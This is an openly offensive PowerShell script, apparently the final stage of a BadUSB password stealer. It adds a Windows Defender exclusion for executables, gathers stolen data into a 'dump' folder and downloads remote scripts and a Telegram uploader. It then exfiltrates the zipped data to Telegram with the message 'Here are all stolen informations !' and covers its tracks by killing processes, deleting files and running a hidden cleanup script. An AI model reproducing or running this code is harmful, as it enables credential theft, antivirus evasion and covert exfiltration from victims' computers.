Set-Location C:\Users\Public\Documents 
#Go to the folder in which we will download files
Add-MpPreference -ExclusionExtension exe -Force 
#Add exception for .exe files in antivirus
mkdir dump 
#Create dump/ directory to put all informations that we'll steal in it
Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 
#Download final .ps1 file to delete all .txt files and stop all powershell process
Invoke-WebRequest LINK -OutFile telegram_uploader.exe 
#Download uploader file to upload all informations on telegram
Compress-Archive dump/ dump.zip 
#Compress dump/ folder to upload it on telegram
./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
Remove-Item ciaoV2_upload.ps1
Remove-Item telegram_uploader.exe
#Enable and disable capslock to know when you can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force 
#Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 
#Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit 
#End .ps1 file
